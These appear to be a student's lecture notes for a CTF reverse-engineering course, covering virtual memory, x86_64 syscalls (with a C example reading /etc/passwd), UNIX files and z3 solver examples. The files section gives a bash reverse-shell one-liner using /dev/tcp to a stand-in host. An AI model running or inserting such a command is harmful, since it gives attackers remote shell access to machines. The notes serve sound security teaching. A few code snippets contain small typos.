Part of [[Wk2 - Reverse Engineering 2]]
# Lecture - Environment and Solvers
Covers
* virtual memory and page tables
* OS basics needed for CTFs
* Theorem solvers

## OS Environment
The memory space/how things are laid out

### Page Mappings
#### Example
![[Pasted image 20240211122812.png]]
Is there anything special about the loading addresses?
Bin located at `0x400000`
Every time you load the binary, stuff gets allocated in the same/similar space
	Ever binary is loaded at `0x400000`
	How does that work?
		Wouldn’t there be a conflict if the same binary was running twice?
		What if two different binaries were running at the same time in the same address space?
	Virtual Memory!

#### Virtual Memory
Virtual Memory is supported by hardware/OS
This will let processes “think” they’re running at the same address space as other process (i.e., `0x400000`)
In reality that is mapped under the hood by the OS/hardware to a different physical address using pages
This is all transparent to us in our CTFs (ring3), but a few points are important


Virtual memory "pages" have mappings
* OS and hardware map the virtual memory pages to physical memory
	* So different instances of the same page points to a different place in the physical memory

#### Pages
Table somewhere in kernel space to generate mappings
![[Pasted image 20240211123630.png]]
Pages have sizes
* Allocated by the loader or by the code
	* Ex: Pages have `4kb` of memory in Linux
Pages are aligned
* Start at `&0x000`
Pages have permissions like files do (RWX)
* Different permissions shown in example above
* Many executable programs themselves are readable and executable, but not executable
* Stack memory will be readable and writable, but not executable
	* Can't put instructions onto the stack and expect to run them

### OS Basics
Modern OS are very complicated
* Deal with tons of peripherals
	* Keyboards, hardware ...etc
* User interaction
* Memory Mappings (Pages)
* ...etc
	Most of this isn't relevant for CTF work
We'll mainly focus on
* User-space processes
	* Well isolated from rest of system
* Syscalls

### Syscalls
Syscalls are ways for processes to interact with the OS
More detail in [[Syscalls]]
The **Syscall Number** is the unique number assigned to each syscall in unix-like OSes

CTFs live in ring3
* Therefore, no kernel exploitation is needed
We still need to tell the OS to do things
* Ex: Shellcode that does a callback
Syscalls are the primary method of interacting with the OS
* There is a special x86_64 instruction called `syscall` that calls into the kernel
* Syscall number points to the specific syscal
* Register Setup:
	`RAX` will store the syscall number
	Arguments: `RDI`, `RSI`, `RDX`, `R10`, `R8`, `R9`
#### Arguments
* Arguments stored in registers: `RDI`, `RSI`, `RDX`, `R10`, `R8`, `R9`
	Arguments are stored in order, the first one is in `RDI`next in `RSI`...etc
		Additional arguments can be placed on the stack
* Args can be large (ex 64-bit ints)
* Args are often just pointers to buffers
	Ex: for reading a file, one of the arguments is just a pointer to the buffer where it will write that file data

There are thousands of system calls

Many things can be accomplished without a system call too
* Important to know for shellcode, which often has limited space

#### Example:
From: [Compiler Explorer](https://godbolt.org/g/7ijzxF)
Shows how to make system call through library function
##### Code:
```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
int main() {
    char c;
    int fd = syscall(2, "/etc/passwd", 0);
    while (syscall(0, fd, &c, 1)) {
        putchar(c);
    }
}
```
`syscall` function allows you to make any system call you want
##### Assembly
```
.LC0:
  .string "/etc/passwd"
main:
  push rbp
  mov rbp, rsp
  sub rsp, 16
  mov edx, 0
  mov esi, OFFSET FLAT:.LC0
  mov edi, 2
  mov eax, 0
  call syscall
  mov DWORD PTR [rbp-4], eax
.L3:
  lea rdx, [rbp-5]
  mov eax, DWORD PTR [rbp-4]
  mov ecx, 1
  mov esi, eax
  mov edi, 0
  mov eax, 0
  call syscall
  test rax, rax
  setne al
  test al, al
  je .L2
  movzx eax, BYTE PTR [rbp-5]
  movsx eax, al
  mov edi, eax
  call putchar
  jmp .L3
.L2:
  mov eax, 0
  leave
  ret
```
Can see parameters being passed when we call `syscall(2, "/etc/passwd", 0)`
```
main:
  ...omitted for brevity...
  mov edx, 0
  mov esi, OFFSET FLAT:.LC0
  mov edi, 2
  mov eax, 0
  call syscall
  ...omitted for brevity...
```
So what happens in that code block:
	`edi` gets the system call number of `2`
	`esi` gets the string value
	`edx` gets the flag of zero
	Essentially:
		`syscall(edi, esi, edx)`
	`eax` is set to 0 to clear it out because it will get the return value later

### Files
On the UNIX-like OSes, **everything** is a file
* You access everything on the system through `open()`, `close()`, `read()`, and `write()` commands
	* This is be very convenient bc you can use things like `grep` to operate on the information coming from these resources
**What is a file**
* Files
* Sockets (Networking)
* Process Info (`/proc`)
	* Info about processes (ex: pages in use, cpu usage, ...etc)
	* Stored as simulated files in a data structure format
* Attached devices (`/dev`)
* System Settings (`/sys`)
This makes it very nice for basic tools  (ex: `find`, `grep`, `awk`) to find what you need
* Or to do bad things:
	ex: `bash -i >& /dev/tcp/1.3.3.7/80 0>&1`
		Create a bash process
		Redirect everything into "file"
			File is actually a socket somewhere else
		Gets the machine to open a bash session connected back to your machine
#### Operations after `open()`
* `open` returns a file descriptor (fd)
	* fd is just a number used to identify a file
* Can see a process's file descriptors here: `/proc/self/fd`
* Standard ones:
	`0`: stdin
	`1`: stdout
	`2`: stderr
* 3 main operations on files
	`read`
	`write`
	`close`
## OS Environment Info
Having an understanding of OS environment does help to structure an attack using weaknesses in memory or OS library functions.
### Cheat Sheets
* [CTF101 - GDB](https://ctf101.org/reverse-engineering/what-is-gdb/)

# Theorem Proving
## Overview
* Complex programs often have to be replicated for brute-forcing (i.e., recurse)
* There IS a better way™
Theorem Proving can help solve complex problems with “simple” input
	General concept: given a set of constraints, a theorem prover will find a solution to satisfy all of them
		Or tell you it’s not satisfiable
Most common theorem prover: z3
## Z3 Types
Z3 supports many types
Most common
* Ints (of an arbitrary size)
* BitVecs: Ints of a specific bit length
* Bools
* Solver Class (how we check for output from the engine)
## Example 1:
```python
from z3 import Ints, Solver
// Create ints
a, b = Ints(‘a b’)
// Define solver
s = Solver()
// Define constraints
s.add(a + b == 1234)
s.add(a - b == 500)
print(s.check())
print(s.model())
```
Defining Constraints
`a + b` must equal `1234`
`a - b` must equal `500`
Running
```bash
>>> sat
>>> [a = 867, b = 367]
```
Running the solver will find values that match the constraints
## Example 2:
```python
from z3 import BitVecs, Solver
// Declare bitvectors of 16 bits each
a, b = BitVecs('a b', 16)
s = Solver()
s.add(a ^ b == 0xbeef)
s.add(a == 0xdead)
print(s.check())
print(s.model())
```
Constraints:
	`a ^ b` must equal `0xbeef`
	`a` must equal `0xdead`
Running it:
```bash
>>> sat
>>> [b = 24642, a = 57005] // 57005 == 0xdead
```
## Example 3: Recurse
Recursive function w/multiple conditions
	Takes in
		ints `a` and `b` to sum together
		Counter int `c`
C Code:
```c
int recurse(int a, int b, int c) {
 int sum = a + b;
	 if (c == 16 && sum == 116369) {
    return 1;
 } else if (c < 16) {
    return recurse(b, sum, c + 1);
 } else {
    return 0;
 }
}
```
So what values of `a`, `b`, and `c` will satisfy this?
	it's hard, so lets use a solver

Recreated code in python to use with the solver
### Solving
Python:
```python
def recurse(a, b):
	for _ in range(17):
		a, b = b, a + b
	return b
a, b = raw_input().split(‘ ‘)
a, b = int(a), int(b)
assert(recurse(a, b) == 116369)
```
#### Solver
```python
from z3 import Ints, Solver
a, b = Ints('a b')
rec = recurse(a, b)
s = Solver()
s.add(rec == 116369)
print(s.check())
print(s.model())
```
Only one constraint:
	`s.add(rec == 116369)`
	It basically calls the function and solves it for you
Solver output:
```python
>>> sat
>>> [b = 37, a = 13]
```

# Conclusion
Theorem solving feels like black magic
* Searches possible solution space for you
It isn't always the fastest
* Too many variables can lead to path explosion
* API often limits feedback
If it takes too long:
* Add more constraints
* Refine focus

Doesn't always get the right solution
* sometimes replication works best
